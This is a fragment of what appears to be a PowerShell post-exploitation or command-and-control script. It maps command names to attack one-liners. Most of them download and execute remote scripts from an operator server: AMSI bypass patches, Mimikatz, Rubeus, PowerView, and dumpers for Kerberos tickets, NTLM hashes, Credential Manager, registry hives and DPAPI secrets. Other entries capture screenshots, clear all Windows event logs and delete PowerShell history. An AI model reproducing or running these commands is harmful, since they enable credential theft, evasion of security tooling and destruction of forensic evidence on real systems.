			"Write-Output '';Write-Output '[+] Invoke-GrabTheHash Loaded | https://github.com/Leo4j/Invoke-GrabTheHash';Write-Output '';New-Item 'tmpfile' -EA 0 > `$null; if(`$?){del 'tmpfile';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-GrabTheHash.ps1');`$HashGrab = Invoke-GrabTheHash | Where-Object{`$_ -match 'NTLM hash'};if(`$HashGrab){`$HashGrab}else{Write-Output '[-] HashGrab Failure'}}else{Write-Output '[-] Please move to a writable directory'}#"
		)
	}
	
	elseif ($Command -eq "Sessions") {
		$predefinedCommands = @(
			'quser;net sessions;query session;klist sessions'
		)
	}
	
	elseif ($Command -eq "Process") {
		$predefinedCommands = @(
			'$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator);$Isx64 = [System.Environment]::Is64BitProcess;if($isAdmin){Write-Output "";Write-Output "[+] Processes sorted by ProcessName:";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort ProcessName | ft -Autosize | Out-String -Width 4096;Write-Output "[+] Processes sorted by Username:";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort UserName,ProcessName | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output "[+] Current Process [x64]:"}else{Write-Output "[+] Current Process [x86]:"};Get-Process -IncludeUserName | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, UserName, Path | Sort ID | Format-Table -AutoSize | Out-String -Width 4096}else{Write-Output "";Write-Output "[+] Processes sorted by PID:";Get-Process | Select ID, ProcessName, SessionId, Path | Sort ID | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output "[+] Current Process [x64]:"}else{Write-Output "[+] Current Process [x86]:"};Get-Process | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, Path | Format-Table -AutoSize | Out-String -Width 4096}#'
		)
	}
	
	elseif ($Command -eq "Software") {
		$predefinedCommands = @(
			'wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version'
		)
	}
	
	elseif ($Command -eq "Net") {
		$predefinedCommands = @(
			'$TempNet = netstat -anp tcp;$TempNet;Write-Output "";Write-Output "[+] Resolving Foreign Addresses";Write-Output "";$TempNet | Select-String -Pattern "\s+\d+\.\d+\.\d+\.\d+:\d+\s+" | ForEach-Object { ($_ -split "\s+")[3] -split ":" | Select-Object -First 1 } | Where-Object { $_ -ne "0.0.0.0" -and $_ -ne "127.0.0.1" } | Sort-Object -Unique | ForEach-Object { try { "$_ - " + [System.Net.Dns]::GetHostEntry($_).HostName } catch { } }'
		)
	}
	
	elseif ($Command -eq "Startup") {
		$predefinedCommands = @(
			'wmic startup get Caption,Command,Location,User'
		)
	}
	
	elseif ($Command -eq "CredMan") {
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/cms.ps1');Enum-Creds"
		)
	}
	
	elseif ($Command -eq "Kerb") {
		$predefinedCommands = @(
			"Write-Output '';Write-Output '[+] PowershellKerberos Loaded | https://github.com/MzHmO/PowershellKerberos';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/dumper.ps1')"
		)
	}
	
	elseif ($Command -eq "Patch") {
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');Write-Output '';Write-Output '[+] Patched'"
		)
	}
	
	elseif ($Command -eq "PatchNet") {
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');Write-Output '';Write-Output '[+] .NET Patched'"
		)
	}
	
	elseif ($Command -eq "Services") {
		$predefinedCommands = @(
			'Get-WmiObject Win32_Service | Where-Object {$_.State -eq "Running"} | Select-Object DisplayName, Name, ProcessId, StartName'
		)
	}
	
	elseif ($Command -eq "Hive") {
		$predefinedCommands = @(
			"Write-Output '';Write-Output '[+] HiveDump Loaded | https://github.com/tmenochet/PowerDump';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/HiveDump.ps1');Invoke-HiveDump"
		)
	}
	
	elseif ($Command -eq "Dpapi") {
		$predefinedCommands = @(
			"Write-Output '';Write-Output '[+] DpapiDump Loaded | https://github.com/tmenochet/PowerDump';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Dpapi.ps1');Invoke-DpapiDump"
		)
	}
	
	elseif ($Command -eq "AutoMimi") {
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-Patamenia.ps1')"
		)
	}
	
	elseif ($Command -eq "Mimi") {
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Suntour.ps1');Write-Output '';Write-Output '[+] Mimi Loaded | https://blog.gentilkiwi.com';Write-Output '';Write-Output '[+] Usage: Mimi -Command ''`"sekurlsa::pth /user:Administrator /domain:ferrari.local /ntlm:217E50203A5ABA59CEFA863C724BF61B`"'''"
		)
	}
	
	elseif ($Command -eq "Rubeus") {
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');Write-Output '';Write-Output '[+] Rubeus Loaded | https://github.com/GhostPack/Rubeus';Write-Output '';Write-Output '[+] Usage: Rubeus <command>';Write-Output '';Write-Output '    Rubeus createnetonly /program:c:\windows\system32\cmd.exe /domain: /dc: /username: /password:fakepass /ptt /ticket:'"
		)
	}
	
	elseif ($Command -eq "PowerView") {
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/pwv.ps1');Write-Output '';Write-Output '[+] PowerView Loaded | https://github.com/PowerShellMafia/PowerSploit'"
		)
	}
	
	elseif ($Command -eq "screenshot") {
		$predefinedCommands = @(
			'Add-Type -AssemblyName System.Windows.Forms;$totalWidth = 1920;$totalHeight = 1080;$bitmap = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight);$graphics = [System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size);$memoryStream = New-Object System.IO.MemoryStream;$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png);$bytes = $memoryStream.ToArray();$base64String = [Convert]::ToBase64String($bytes);$memoryStream.Close();$base64String'
		)
	}
	
	elseif ($Command -eq "screen4K") {
		$predefinedCommands = @(
			'Add-Type -AssemblyName System.Windows.Forms;$totalWidth = 3840;$totalHeight = 2160;$bitmap = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight);$graphics = [System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size);$memoryStream = New-Object System.IO.MemoryStream;$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png);$bytes = $memoryStream.ToArray();$base64String = [Convert]::ToBase64String($bytes);$memoryStream.Close();$base64String'
		)
	}
	
	elseif ($Command -eq "ClearLogs") {
		$predefinedCommands = @(
			'wevtutil el | ForEach-Object {wevtutil cl "$_"};Write-Output "[+] Logs Cleared"'
		)
	}
	
	elseif ($Command -eq "ClearHistory") {
		$predefinedCommands = @(
			'Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";Write-Output "[+] History Cleared"'
		)
	}
	
	$predefinedCommands
	
}
